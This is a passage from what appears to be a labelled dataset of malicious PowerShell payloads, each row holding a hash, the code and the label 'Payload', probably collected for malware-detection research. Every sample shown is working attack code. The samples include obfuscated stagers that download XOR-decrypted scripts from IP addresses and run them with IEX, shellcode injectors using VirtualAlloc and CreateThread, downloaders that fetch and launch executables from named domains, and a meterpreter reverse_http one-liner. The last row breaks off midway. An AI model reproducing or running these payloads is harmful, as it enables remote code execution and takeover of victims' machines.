$wc=NEW-ObJEcT SysTeM.Net.WEBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadERS.AdD('User-Agent',$u);$wC.PrOxy = [SystEm.Net.WeBRequEst]::DEfaultWeBProXy;$Wc.PrOxy.CREdEnTIaLs = [SyStem.NEt.CrEDenTiALCacHe]::DefauLTNetwORkCReDENtIalS;$K='pEv=HxFmTo.dOqVZz~kaiC{-+;S)U1X3';$I=0;[char[]]$b=([ChAR[]]($WC.DoWNLoaDSTRIng(""http://192.168.1.3:8080/index.asp"")))|%{$_-bXor$K[$I++%$K.Length]};IEX ($b-jOIn'')

",Payload
b5f1cf8704557687553fb34443d467e37e34de21ddbbea1650704a35e64e7ac4,"
(New-Object System.Net.WebClient).DownloadFile('http://www.fluidsystems.ml/P1/Pa_001.exe',""$env:TEMP\\Pa_001.exe"");Start-Process (""$env:TEMP\\Pa_001.exe"")

",Payload
b73a169a6b1584d19902db980c2944d96c49b7ae9b91b9c805dd2fa123db6cc0,"
[SySTEm.Net.ServICePOiNtMAnaGeR]::EXpeCT100CONtinUE = 0;$Wc=NEw-OBjECt SYsteM.Net.WEBClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaderS.Add('User-Agent',$u);$wc.ProXy = [SyStEM.Net.WEBREQUEST]::DeFAULTWeBPROXy;$wc.PrOXy.CredENtials = [SysTeM.NeT.CREDentiaLCAChE]::DEFAUltNeTwORkCreDenTIals;$K='005f47cddf568dacb8d03e20ba682cf9';$R=99;DO{tRY{$i=0;[cHAR[]]$B=([CHAR[]]($WC.DOWNLOADSTriNg(""http://192.168.1.10:80/index.asp"")))|%{$_-bXOr$k[$I++%$K.LeNGtH]};IEX ($b-joIN''); $R=0;}CAtcH{slEep 5;$R--}} WHile ($R -gT 0)

",Payload
f65eeb15b7874043fddf6e576460bd2968279b58bbada7ff772f23a5038d0f3b,"
$1F87 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1F87 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xde,0x11,0x56,0xf0,0xda,0xce,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xed,0xfc,0x03,0x7d,0xd1,0xf3,0xa3,0x0c,0x05,0x71,0x4b,0xed,0xd5,0x16,0xc5,0x08,0xe4,0x16,0xb1,0x59,0x56,0xa7,0xb1,0x0c,0x5a,0x4c,0x97,0xa4,0xe9,0x20,0x30,0xca,0x5a,0x8e,0x66,0xe5,0x5b,0xa3,0x5b,0x64,0xdf,0xbe,0x8f,0x46,0xde,0x70,0xc2,0x87,0x27,0x6c,0x2f,0xd5,0xf0,0xfa,0x82,0xca,0x75,0xb6,0x1e,0x60,0xc5,0x56,0x27,0x95,0x9d,0x59,0x06,0x08,0x96,0x03,0x88,0xaa,0x7b,0x38,0x81,0xb4,0x98,0x05,0x5b,0x4e,0x6a,0xf1,0x5a,0x86,0xa3,0xfa,0xf1,0xe7,0x0c,0x09,0x0b,0x2f,0xaa,0xf2,0x7e,0x59,0xc9,0x8f,0x78,0x9e,0xb0,0x4b,0x0c,0x05,0x12,0x1f,0xb6,0xe1,0xa3,0xcc,0x21,0x61,0xaf,0xb9,0x26,0x2d,0xb3,0x3c,0xea,0x45,0xcf,0xb5,0x0d,0x8a,0x46,0x8d,0x29,0x0e,0x03,0x55,0x53,0x17,0xe9,0x38,0x6c,0x47,0x52,0xe4,0xc8,0x03,0x7e,0xf1,0x60,0x4e,0x16,0x36,0x49,0x71,0xe6,0x50,0xda,0x02,0xd4,0xff,0x70,0x8d,0x54,0x77,0x5f,0x4a,0x9b,0xa2,0x27,0xc4,0x62,0x4d,0x58,0xcc,0xa0,0x19,0x08,0x66,0x01,0x22,0xc3,0x76,0xae,0xf7,0x7e,0x72,0x38,0x38,0xd6,0x99,0x13,0xd0,0x25,0x62,0x62,0x9a,0xa3,0x84,0x34,0x8c,0xe3,0x18,0xf4,0x7c,0x44,0xc9,0x9c,0x96,0x4b,0x36,0xbc,0x98,0x81,0x5f,0x56,0x77,0x7c,0x37,0xce,0xee,0x25,0xc3,0x6f,0xee,0xf3,0xa9,0xaf,0x64,0xf0,0x4e,0x61,0x8d,0x7d,0x5d,0x15,0x7d,0xc8,0x3f,0xb3,0x82,0xe6,0x2a,0x3b,0x17,0x0d,0xfd,0x6c,0x8f,0x0f,0xd8,0x5a,0x10,0xef,0x0f,0xd1,0x99,0x65,0xf0,0x8d,0xe5,0x69,0xf0,0x4d,0xb0,0xe3,0xf0,0x25,0x64,0x50,0xa3,0x50,0x6b,0x4d,0xd7,0xc9,0xfe,0x6e,0x8e,0xbe,0xa9,0x06,0x2c,0x99,0x9e,0x88,0xcf,0xcc,0x1e,0xf4,0x19,0x28,0x55,0x14,0x9a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$I8fS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($I8fS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$I8fS,0,0,0);for (;;){Start-sleep 60};

",Payload
7a4e786f94c06f38f7025bd4f402c0dabe1ffec7cdf9b49d46ea6850811a3168,"
$9Gip = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $9Gip -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcd,0xd9,0x74,0x24,0xf4,0xbb,0x3a,0xfd,0xb4,0xe5,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x5a,0x18,0x83,0xea,0xfc,0x03,0x5a,0x2e,0x1f,0x41,0x19,0xa6,0x5d,0xaa,0xe2,0x36,0x02,0x22,0x07,0x07,0x02,0x50,0x43,0x37,0xb2,0x12,0x01,0xbb,0x39,0x76,0xb2,0x48,0x4f,0x5f,0xb5,0xf9,0xfa,0xb9,0xf8,0xfa,0x57,0xf9,0x9b,0x78,0xaa,0x2e,0x7c,0x41,0x65,0x23,0x7d,0x86,0x98,0xce,0x2f,0x5f,0xd6,0x7d,0xc0,0xd4,0xa2,0xbd,0x6b,0xa6,0x23,0xc6,0x88,0x7e,0x45,0xe7,0x1e,0xf5,0x1c,0x27,0xa0,0xda,0x14,0x6e,0xba,0x3f,0x10,0x38,0x31,0x8b,0xee,0xbb,0x93,0xc2,0x0f,0x17,0xda,0xeb,0xfd,0x69,0x1a,0xcb,0x1d,0x1c,0x52,0x28,0xa3,0x27,0xa1,0x53,0x7f,0xad,0x32,0xf3,0xf4,0x15,0x9f,0x02,0xd8,0xc0,0x54,0x08,0x95,0x87,0x33,0x0c,0x28,0x4b,0x48,0x28,0xa1,0x6a,0x9f,0xb9,0xf1,0x48,0x3b,0xe2,0xa2,0xf1,0x1a,0x4e,0x04,0x0d,0x7c,0x31,0xf9,0xab,0xf6,0xdf,0xee,0xc1,0x54,0xb7,0xc3,0xeb,0x66,0x47,0x4c,0x7b,0x14,0x75,0xd3,0xd7,0xb2,0x35,0x9c,0xf1,0x45,0x3a,0xb7,0x46,0xd9,0xc5,0x38,0xb7,0xf3,0x01,0x6c,0xe7,0x6b,0xa0,0x0d,0x6c,0x6c,0x4d,0xd8,0x23,0x3c,0xe1,0xb3,0x83,0xec,0x41,0x64,0x6c,0xe7,0x4e,0x5b,0x8c,0x08,0x85,0xf4,0x27,0xf2,0x4d,0x3b,0x1f,0xfd,0x86,0xd3,0x62,0xfe,0x9a,0xb9,0xea,0x18,0xf0,0xad,0xba,0xb3,0x6c,0x57,0xe7,0x48,0x0d,0x98,0x3d,0x35,0x0d,0x12,0xb2,0xc9,0xc3,0xd3,0xbf,0xd9,0xb3,0x13,0x8a,0x80,0x15,0x2b,0x20,0xae,0x99,0xb9,0xcf,0x79,0xce,0x55,0xd2,0x5c,0x38,0xfa,0x2d,0x8b,0x33,0x33,0xb8,0x74,0x2b,0x3c,0x2c,0x75,0xab,0x6a,0x26,0x75,0xc3,0xca,0x12,0x26,0xf6,0x14,0x8f,0x5a,0xab,0x80,0x30,0x0b,0x18,0x02,0x59,0xb1,0x47,0x64,0xc6,0x4a,0xa2,0x74,0x3a,0x9d,0x8a,0x02,0x52,0x1d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$E2TI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($E2TI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$E2TI,0,0,0);for (;;){Start-sleep 60};

",Payload
21d04d37dfb4551f54607a3532d6c0d5f46ec52c20ae6db78eb8a4f904a42994,"
(New-Object System.Net.WebClient).DownloadFile('http://danhviet.com.vn/app/p2.exe','mess.exe');Start-Process 'mess.exe'

",Payload
d043632a506645948843a7c0ac027d726e5988b30bad22f5a71e4e160b654881,"
$eh6e = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eh6e -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x56,0x60,0xe7,0xe4,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x45,0x0f,0x03,0x45,0x59,0x82,0x12,0x18,0x8d,0xc0,0xdd,0xe1,0x4d,0xa5,0x54,0x04,0x7c,0xe5,0x03,0x4c,0x2e,0xd5,0x40,0x00,0xc2,0x9e,0x05,0xb1,0x51,0xd2,0x81,0xb6,0xd2,0x59,0xf4,0xf9,0xe3,0xf2,0xc4,0x98,0x67,0x09,0x19,0x7b,0x56,0xc2,0x6c,0x7a,0x9f,0x3f,0x9c,0x2e,0x48,0x4b,0x33,0xdf,0xfd,0x01,0x88,0x54,0x4d,0x87,0x88,0x89,0x05,0xa6,0xb9,0x1f,0x1e,0xf1,0x19,0xa1,0xf3,0x89,0x13,0xb9,0x10,0xb7,0xea,0x32,0xe2,0x43,0xed,0x92,0x3b,0xab,0x42,0xdb,0xf4,0x5e,0x9a,0x1b,0x32,0x81,0xe9,0x55,0x41,0x3c,0xea,0xa1,0x38,0x9a,0x7f,0x32,0x9a,0x69,0x27,0x9e,0x1b,0xbd,0xbe,0x55,0x17,0x0a,0xb4,0x32,0x3b,0x8d,0x19,0x49,0x47,0x06,0x9c,0x9e,0xce,0x5c,0xbb,0x3a,0x8b,0x07,0xa2,0x1b,0x71,0xe9,0xdb,0x7c,0xda,0x56,0x7e,0xf6,0xf6,0x83,0xf3,0x55,0x9e,0x60,0x3e,0x66,0x5e,0xef,0x49,0x15,0x6c,0xb0,0xe1,0xb1,0xdc,0x39,0x2c,0x45,0x23,0x10,0x88,0xd9,0xda,0x9b,0xe9,0xf0,0x18,0xcf,0xb9,0x6a,0x89,0x70,0x52,0x6b,0x36,0xa5,0xcf,0x6e,0xa0,0x2a,0x2d,0xcf,0xb9,0xdb,0x4f,0x2f,0xa8,0x43,0xd9,0xc9,0x9a,0x23,0x89,0x45,0x5a,0x94,0x69,0x36,0x32,0xfe,0x65,0x69,0x22,0x01,0xac,0x02,0xc8,0xee,0x19,0x7a,0x64,0x96,0x03,0xf0,0x15,0x57,0x9e,0x7c,0x15,0xd3,0x2d,0x80,0xdb,0x14,0x5b,0x92,0x8b,0xd4,0x16,0xc8,0x1d,0xea,0x8c,0x67,0xa1,0x7e,0x2b,0x2e,0xf6,0x16,0x31,0x17,0x30,0xb9,0xca,0x72,0x4b,0x70,0x5f,0x3d,0x23,0x7d,0x8f,0xbd,0xb3,0x2b,0xc5,0xbd,0xdb,0x8b,0xbd,0xed,0xfe,0xd3,0x6b,0x82,0x53,0x46,0x94,0xf3,0x00,0xc1,0xfc,0xf9,0x7f,0x25,0xa3,0x02,0xaa,0xb7,0x9f,0xd4,0x92,0xcd,0xf1,0xe4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Otjb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Otjb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Otjb,0,0,0);for (;;){Start-sleep 60};

",Payload
550e7dabdcd06662da3f1d0d3657d60aaed5719695205b6ffdcea6895f825d64,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc3,0x57,0xdd,0x65,0xd9,0xc4,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x13,0x03,0x45,0x13,0x83,0xc5,0xc7,0xb5,0x28,0x99,0x2f,0xbb,0xd3,0x62,0xaf,0xdc,0x5a,0x87,0x9e,0xdc,0x39,0xc3,0xb0,0xec,0x4a,0x81,0x3c,0x86,0x1f,0x32,0xb7,0xea,0xb7,0x35,0x70,0x40,0xee,0x78,0x81,0xf9,0xd2,0x1b,0x01,0x00,0x07,0xfc,0x38,0xcb,0x5a,0xfd,0x7d,0x36,0x96,0xaf,0xd6,0x3c,0x05,0x40,0x53,0x08,0x96,0xeb,0x2f,0x9c,0x9e,0x08,0xe7,0x9f,0x8f,0x9e,0x7c,0xc6,0x0f,0x20,0x51,0x72,0x06,0x3a,0xb6,0xbf,0xd0,0xb1,0x0c,0x4b,0xe3,0x13,0x5d,0xb4,0x48,0x5a,0x52,0x47,0x90,0x9a,0x54,0xb8,0xe7,0xd2,0xa7,0x45,0xf0,0x20,0xda,0x91,0x75,0xb3,0x7c,0x51,0x2d,0x1f,0x7d,0xb6,0xa8,0xd4,0x71,0x73,0xbe,0xb3,0x95,0x82,0x13,0xc8,0xa1,0x0f,0x92,0x1f,0x20,0x4b,0xb1,0xbb,0x69,0x0f,0xd8,0x9a,0xd7,0xfe,0xe5,0xfd,0xb8,0x5f,0x40,0x75,0x54,0x8b,0xf9,0xd4,0x30,0x78,0x30,0xe7,0xc0,0x16,0x43,0x94,0xf2,0xb9,0xff,0x32,0xbe,0x32,0x26,0xc4,0xc1,0x68,0x9e,0x5a,0x3c,0x93,0xdf,0x73,0xfa,0xc7,0x8f,0xeb,0x2b,0x68,0x44,0xec,0xd4,0xbd,0xf1,0xe9,0x42,0xfe,0xae,0xf2,0x99,0x96,0xac,0xf2,0x82,0xf6,0x38,0x14,0xec,0xa6,0x6a,0x89,0x4c,0x17,0xcb,0x79,0x24,0x7d,0xc4,0xa6,0x54,0x7e,0x0e,0xcf,0xfe,0x91,0xe7,0xa7,0x96,0x08,0xa2,0x3c,0x07,0xd4,0x78,0x39,0x07,0x5e,0x8f,0xbd,0xc9,0x97,0xfa,0xad,0xbd,0x57,0xb1,0x8c,0x6b,0x67,0x6f,0xba,0x93,0xfd,0x94,0x6d,0xc4,0x69,0x97,0x48,0x22,0x36,0x68,0xbf,0x39,0xff,0xfc,0x00,0x55,0x00,0x11,0x81,0xa5,0x56,0x7b,0x81,0xcd,0x0e,0xdf,0xd2,0xe8,0x50,0xca,0x46,0xa1,0xc4,0xf5,0x3e,0x16,0x4e,0x9e,0xbc,0x41,0xb8,0x01,0x3e,0xa4,0x38,0x7d,0xe9,0x80,0x4e,0x6f,0x29;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
6d78f6ee92b9b3780c9d68d8cafd9a3d0ae6ca1544987ef707e6eba349b367ab,"
$w3Oa = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $w3Oa -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x41,0xc1,0x85,0xf0,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x5b,0x31,0x6a,0x14,0x03,0x6a,0x14,0x83,0xc2,0x04,0xa3,0x34,0x79,0x18,0xa1,0xb7,0x82,0xd9,0xc5,0x3e,0x67,0xe8,0xc5,0x25,0xe3,0x5b,0xf5,0x2e,0xa1,0x57,0x7e,0x62,0x52,0xe3,0xf2,0xab,0x55,0x44,0xb8,0x8d,0x58,0x55,0x90,0xee,0xfb,0xd5,0xea,0x22,0xdc,0xe4,0x25,0x37,0x1d,0x20,0x5b,0xba,0x4f,0xf9,0x10,0x69,0x60,0x8e,0x6c,0xb2,0x0b,0xdc,0x61,0xb2,0xe8,0x95,0x80,0x93,0xbe,0xae,0xdb,0x33,0x40,0x62,0x50,0x7a,0x5a,0x67,0x5c,0x34,0xd1,0x53,0x2b,0xc7,0x33,0xaa,0xd4,0x64,0x7a,0x02,0x27,0x74,0xba,0xa5,0xd7,0x03,0xb2,0xd5,0x6a,0x14,0x01,0xa7,0xb0,0x91,0x92,0x0f,0x33,0x01,0x7f,0xb1,0x90,0xd4,0xf4,0xbd,0x5d,0x92,0x53,0xa2,0x60,0x77,0xe8,0xde,0xe9,0x76,0x3f,0x57,0xa9,0x5c,0x9b,0x33,0x6a,0xfc,0xba,0x99,0xdd,0x01,0xdc,0x41,0x82,0xa7,0x96,0x6c,0xd7,0xd5,0xf4,0xf8,0x49,0x83,0x72,0xf9,0xfd,0x3c,0x12,0x97,0x94,0x96,0x8c,0x2b,0x11,0x31,0x4a,0x4b,0x08,0x0c,0x8f,0xe0,0xe1,0x3c,0x7c,0x54,0x6d,0xf9,0xd4,0x23,0xca,0x02,0x0d,0x80,0x47,0x97,0xad,0x74,0x34,0x0d,0xe2,0x92,0xc2,0xd1,0x02,0x63,0x1d,0x8d,0x46,0x50,0x2c,0x08,0x47,0xc6,0xc6,0x3d,0xce,0x79,0xd0,0x3d,0x05,0x0c,0x1a,0x92,0xce,0x0f,0xa0,0x75,0x8b,0x43,0xf7,0x26,0xc4,0x30,0xa1,0xa0,0x01,0xe3,0x63,0x0a,0x29,0xd9,0xed,0x06,0xdf,0xbd,0x42,0x84,0x8c,0x12,0x32,0x42,0x1e,0x93,0xa2,0xe9,0x9f,0x4e,0x57,0xcd,0x15,0x7b,0x18,0xbb,0x38,0x13,0x56,0xf6,0x61,0xb2,0x69,0x2c,0x0f,0x7b,0xfd,0xcf,0xc0,0x7b,0xfd,0xa7,0xe0,0x7b,0xbd,0x37,0xb2,0x13,0x65,0x9c,0x67,0x01,0x6a,0x09,0x14,0x9a,0xc7,0x3b,0xfc,0x4a,0x8f,0x3b,0x23,0x75,0x4f,0x6f,0x75,0x1d,0x5d,0x19,0xf0,0x3f,0x9e,0xf0,0x86,0x00,0x14,0x36,0x03,0x87,0xd5,0x0b,0x91,0x48,0xa0,0x6e,0xc2,0x8b,0x15,0x99,0x7a,0xf4,0x56,0xa6,0x18,0x68,0x9a,0x74,0xd6,0x5c,0xf7,0xb1,0x2f,0x8c,0x35,0x8c,0x7c,0xe3,0x0e,0xc6,0xac,0x9a,0x00,0x0b,0xc2,0x33,0x95,0x27,0x4c,0xa9,0x34,0xbb,0xf8,0x1c,0x87,0x15,0x62,0x30,0x8a,0x19,0x11,0xba,0x31,0xf4,0xb8,0x2f,0xd8,0x72,0x54,0xde,0x7b,0xf4,0xd9,0x30,0x18,0x95,0x70,0x4d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$eJn4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($eJn4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$eJn4,0,0,0);for (;;){Start-sleep 60};

",Payload
4253fb2f98a8a73eb06e21a9bfe765799abbfc82f22b9fd5b9a051008562c5a2,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xdb,0x8d,0xea,0xce,0xdb,0xde,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x5d,0x0f,0x03,0x5d,0xd4,0x6f,0x1f,0x32,0x02,0xed,0xe0,0xcb,0xd2,0x92,0x69,0x2e,0xe3,0x92,0x0e,0x3a,0x53,0x23,0x44,0x6e,0x5f,0xc8,0x08,0x9b,0xd4,0xbc,0x84,0xac,0x5d,0x0a,0xf3,0x83,0x5e,0x27,0xc7,0x82,0xdc,0x3a,0x14,0x65,0xdd,0xf4,0x69,0x64,0x1a,0xe8,0x80,0x34,0xf3,0x66,0x36,0xa9,0x70,0x32,0x8b,0x42,0xca,0xd2,0x8b,0xb7,0x9a,0xd5,0xba,0x69,0x91,0x8f,0x1c,0x8b,0x76,0xa4,0x14,0x93,0x9b,0x81,0xef,0x28,0x6f,0x7d,0xee,0xf8,0xbe,0x7e,0x5d,0xc5,0x0f,0x8d,0x9f,0x01,0xb7,0x6e,0xea,0x7b,0xc4,0x13,0xed,0xbf,0xb7,0xcf,0x78,0x24,0x1f,0x9b,0xdb,0x80,0x9e,0x48,0xbd,0x43,0xac,0x25,0xc9,0x0c,0xb0,0xb8,0x1e,0x27,0xcc,0x31,0xa1,0xe8,0x45,0x01,0x86,0x2c,0x0e,0xd1,0xa7,0x75,0xea,0xb4,0xd8,0x66,0x55,0x68,0x7d,0xec,0x7b,0x7d,0x0c,0xaf,0x13,0xb2,0x3d,0x50,0xe3,0xdc,0x36,0x23,0xd1,0x43,0xed,0xab,0x59,0x0b,0x2b,0x2b,0x9e,0x26,0x8b,0xa3,0x61,0xc9,0xec,0xea,0xa5,0x9d,0xbc,0x84,0x0c,0x9e,0x56,0x55,0xb1,0x4b,0xf8,0x05,0x1d,0x24,0xb9,0xf5,0xdd,0x94,0x51,0x1c,0xd2,0xcb,0x42,0x1f,0x39,0x64,0xe8,0xe5,0xa9,0x09,0x3e,0x77,0x81,0x66,0xc3,0x78,0xc0,0x2b,0x4a,0x9e,0x88,0xc3,0x1a,0x08,0x24,0x7d,0x07,0xc2,0xd5,0x82,0x9d,0xae,0xd5,0x09,0x12,0x4e,0x9b,0xf9,0x5f,0x5c,0x4b,0x0a,0x2a,0x3e,0xdd,0x15,0x80,0x55,0xe1,0x83,0x2f,0xfc,0xb6,0x3b,0x32,0xd9,0xf0,0xe3,0xcd,0x0c,0x8b,0x2a,0x58,0xef,0xe3,0x52,0x8c,0xef,0xf3,0x04,0xc6,0xef,0x9b,0xf0,0xb2,0xa3,0xbe,0xfe,0x6e,0xd0,0x13,0x6b,0x91,0x81,0xc0,0x3c,0xf9,0x2f,0x3f,0x0a,0xa6,0xd0,0x6a,0x8a,0x9a,0x06,0x52,0xf8,0xf2,0x9a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
04093c4da6490e125acf3ae17f477fb95d69304dcbe02464d26df2aa4a969730,"
iex (New-Object Net.WebClient).DownloadString(""https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1""); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 88.160.254.183 -Lport 8080 -Force

",Payload
497df3e8ae1d72a8dbcb639148dced0781e3a618e4d1c39452abbd742f067546,"
$WC=NeW-OBJEcT SysTem.NEt.WEBCLIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAders.Add('User-Agent',$u);$WC.PROXY = [SYStEM.NEt.WEBREqUESt]::DefaUltWEbProxy;$Wc.Proxy.CredENtiALs = [SyStEm.Net.CREDENTIALCacHe]::DEfAUltNEtworkCREDeNTiaLS;$K='j=5u]2coli8\\PqEOZDHCT~af+,7tI[A^';$i=0;[Char[]]$b=([cHAr[]]($wc.DOWNLOaDStRING(""http://137.117.188.120:443/index.asp"")))|%{$_-bXor$k[$i++%$K.LEngTh]};IEX ($B-JOIn'')

",Payload
df0932f22d358be88bed4959cda2613a430d2b3b2cc7ad6128c466b18e79db8d,"
[SySTEm.NeT.ServiCePoinTManAgeR]::EXpect100CONtiNUe = 0;$wC=NEw-OBjecT SystEM.NeT.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdErS.ADD('User-Agent',$u);$WC.PROxY = [SySTem.Net.WEbReQUest]::DEFaUlTWeBProXy;$wC.PROxY.CREDEnTials = [SYSTEM.NEt.CReDentIaLCAcHE]::DEFaUltNeTworkCredeNTIalS;$K='ceb6c970658f31504a901b89dcd3e461';$i=0;[CHar[]]$B=([char[]]($wC.DoWNloAdSTRiNG(""http://172.18.209.58:8080/index.asp"")))|%{$_-bXOr$K[$I++%$k.LenGtH]};IEX ($b-jOin'')

",Payload
686e7addb006e7fff39c7bb13c61511a25c537e6f3e66ed7f53f96c3933933c7,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x2